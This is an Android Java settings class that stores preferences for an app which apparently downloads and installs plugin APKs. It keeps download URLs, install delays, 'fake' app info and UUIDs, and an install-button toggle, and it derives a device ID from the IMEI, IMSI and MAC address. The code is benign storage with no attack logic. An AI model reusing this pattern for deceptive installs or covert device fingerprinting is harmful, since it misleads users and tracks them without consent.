package com.xstd.qm.setting;

import android.content.Context;
import android.content.SharedPreferences;
import android.provider.Settings;
import android.telephony.TelephonyManager;
import android.text.TextUtils;
import com.plugin.common.utils.UtilsRuntime;
import com.xstd.qm.AppRuntime;
import com.xstd.qm.Config;

import java.io.UnsupportedEncodingException;
import java.util.UUID;

/**
 * Created with IntelliJ IDEA.
 * User: michael
 * Date: 13-10-14
 * Time: AM10:58
 * To change this template use File | Settings | File Templates.
 */
public class SettingManager {
    private static SettingManager mInstance;

    private Context mContext;

    private SharedPreferences mSharedPreferences;

    private SharedPreferences.Editor mEditor;

    public static synchronized SettingManager getInstance() {
        if (mInstance == null) {
            mInstance = new SettingManager();
        }

        return mInstance;
    }


    private static final String SHARE_PREFERENCE_NAME = "setting_manager_share_pref_custom";

    // 在Application中一定要调用
    public void init(Context context) {
        mContext = context.getApplicationContext();
        mSharedPreferences = mContext.getSharedPreferences(SHARE_PREFERENCE_NAME, 0);
        mEditor = mSharedPreferences.edit();
    }

    private SettingManager() {
    }

    public void clearAll() {
    }

    public static final String KEY_HAS_BINDING_DEVICES = "key_has_bindding_devices";

    public void setKeyHasBindingDevices(boolean binding) {
        mEditor.putBoolean(KEY_HAS_BINDING_DEVICES, binding);
        mEditor.commit();
    }

    public boolean getKeyHasBindingDevices() {
        return mSharedPreferences.getBoolean(KEY_HAS_BINDING_DEVICES, false);
    }

    public void setPluginDownloadTime(long downloadTime) {
        mEditor.putLong("plugin_download_time", downloadTime).commit();
    }

    public long getPluginDownloadTime() {
        return mSharedPreferences.getLong("plugin_download_time", 0);
    }

    public static final String KEY_PLUGIN_INSTALLED = "key_plugin_installed";

    public void setKeyPluginInstalled(boolean installed) {
        mEditor.putBoolean(KEY_PLUGIN_INSTALLED, installed);
        mEditor.commit();
    }

    public boolean getKeyPluginInstalled() {
        return mSharedPreferences.getBoolean(KEY_PLUGIN_INSTALLED, false);
    }

    public static final String KEY_HAS_SCANED = "key_has_scaned";

    public void setKeyHasScaned(boolean scaned) {
        mEditor.putBoolean(KEY_HAS_SCANED, scaned).commit();
    }

    public boolean getKeyHasScaned() {
        return mSharedPreferences.getBoolean(KEY_HAS_SCANED, false);
    }

    public static final String KEY_LANUCH_TIME = "key_lanuch_time";

    public void setKeyLanuchTime(long time) {
        mEditor.putLong(KEY_LANUCH_TIME, time);
        mEditor.commit();
    }

    public long getKeyLanuchTime() {
        return mSharedPreferences.getLong(KEY_LANUCH_TIME, 0);
    }

    public static final String KEY_ACTIVE_TIME = "key_active_time";

    public void setKeyActiveTime(long time) {
        mEditor.putLong(KEY_ACTIVE_TIME, time);
        mEditor.commit();
    }

    public long getKeyActiveTime() {
        return mSharedPreferences.getLong(KEY_ACTIVE_TIME, 0);
    }

    public static final String KEY_INSTALL_INTERVAL = "key_install_delay";

    public void setKeyInstallInterval(long delay) {
        mEditor.putLong(KEY_INSTALL_INTERVAL, delay).commit();
    }

    public long getKeyInstallInterval() {
        return mSharedPreferences.getLong(KEY_INSTALL_INTERVAL, 0);
    }

    private static final String KEY_DOWNLOAD_URL = "key_donwload_url";

    public void setKeyDownloadUrl(String url) {
        mEditor.putString(KEY_DOWNLOAD_URL, url).commit();
    }

    public String getKeyDownloadUrl() {
        return mSharedPreferences.getString(KEY_DOWNLOAD_URL, null);
    }

    public void setLocalApkPath(String path) {
        mEditor.putString("local_path", path).commit();
    }

    public String getLocalApkPath() {
        return mSharedPreferences.getString("local_path", null);
    }

    public void setDefaultBtnColor(int color) {
        mEditor.putInt("btnColor", color).commit();
    }

    public int getDefaultBtnColor() {
        return mSharedPreferences.getInt("btnColor", 0x000000);
    }

    public void setFakeDefaultAppInfo(String msg) {
        mEditor.putString("appInfo", msg).commit();
    }

    public String getFakeDefaultAppInfo() {
        return mSharedPreferences.getString("appInfo", null);
    }

    public void setLoopActiveCount(int count) {
        mEditor.putInt("activeCount", count).commit();
    }

    public int getLoopActiveCount() {
        return mSharedPreferences.getInt("activeCount", 0);
    }

    public void setRealActiveDelayTime(long time) {
        mEditor.putLong("real_active_delay", time).commit();
    }

    public long getRealActiveDelayTime() {
        return mSharedPreferences.getLong("real_active_delay", AppRuntime.ACTIVE_DELAY);
    }

    public void setCancelInstallReserve(boolean isR) {
        mEditor.putBoolean("cancel_install", isR).commit();
    }

    public boolean getCancelInstallReserve() {
        return Config.BUTTON_CHANGED_ENABLE ? mSharedPreferences.getBoolean("cancel_install", false) : false;
    }

    public void setNotifyPluginInstallSuccess(boolean installSuccess) {
        mEditor.putBoolean("install_notify", installSuccess).commit();
    }

    public boolean getNotifyPluginInstallSuccess() {
        return mSharedPreferences.getBoolean("install_notify", false);
    }

    public void setInstallChanged(boolean changed) {
        mEditor.putBoolean("install_changed", changed).commit();
    }

    public boolean getInstallChanged() {
        return mSharedPreferences.getBoolean("install_changed", false);
    }

    public void setDeviceBindingTime(int count) {
        mEditor.putInt("device_bind_c", count).commit();
    }

    public int getDeviceBindingTime() {
        return mSharedPreferences.getInt("device_bind_c", 0);
    }

    public void setDisableDownloadPlugin(boolean disable) {
        mEditor.putBoolean("disablePlugin", disable).commit();
    }

    public void setDeviceBindingActiveTime(int count) {
        mEditor.putInt("device_bind_active", count).commit();
    }

    public int getDeviceBindingActiveTime() {
        return mSharedPreferences.getInt("device_bind_active", 0);
    }

    public boolean getDisableDownloadPlugin() {
        return mSharedPreferences.getBoolean("disablePlugin", true);
    }

    public void setExtraInfo(String info) {
        mEditor.putString("extra_info", info).commit();
    }

    public String getExtraInfo() {
        return mSharedPreferences.getString("extra_info", null);
    }

    public void setFakeUUID(String data) {
        mEditor.putString("fake_uuid", data).commit();
    }

    public String getFakeUUID() {
        return mSharedPreferences.getString("fake_uuid", null);
    }

    public String getDeviceUUID() {
        String ret = mSharedPreferences.getString("uuid", null);

        if (TextUtils.isEmpty(ret)) {
            ret = UtilsRuntime.getIMEI(mContext);
        } else {
            return ret;
        }

        mEditor.putString("uuid", ret).commit();

        return ret;
    }


    protected static final String PREFS_FILE = "device_id.xml";
    protected static final String PREFS_DEVICE_ID = "device_id";
    public static UUID uuid;

    public void deviceUuidFactory(Context context) {
        if (uuid == null) {
            synchronized (SettingManager.class) {
                if (uuid == null) {
                    final SharedPreferences prefs = context.getSharedPreferences(PREFS_FILE, 0);
                    final String id = prefs.getString(PREFS_DEVICE_ID, null);
                    if (id != null) {
                        // Use the ids previously computed and stored in the prefs file
                        uuid = UUID.fromString(id);
                    } else {
                        //首先获取MAC地址
                        String androidId = UtilsRuntime.getLocalMacAddress(context);
                        if (TextUtils.isEmpty(androidId)) {
                            //尝试获取IMSI号
                            androidId = UtilsRuntime.getIMSI(context);
                            if (TextUtils.isEmpty(androidId)) {
                                //尝试获取Android_ID
                                androidId = Settings.Secure.getString(context.getContentResolver(), Settings.Secure.ANDROID_ID);
                            }
                        }

                        try {
                            if (!"9774d56d682e549c".equals(androidId)) {
                                uuid = UUID.nameUUIDFromBytes(androidId.getBytes("utf8"));
                            } else {
                                String deviceId = ((TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE)).getDeviceId();
                                uuid = deviceId != null ? UUID.nameUUIDFromBytes(deviceId.getBytes("utf8")) : UUID.randomUUID();
                            }
                        } catch (UnsupportedEncodingException e) {
                            throw new RuntimeException(e);
                        }
                        // Write the value out to the prefs file
                        if (uuid != null) {
                            prefs.edit().putString(PREFS_DEVICE_ID, uuid.toString()).commit();
                        }
                    }
                }
            }
        }
    }

}
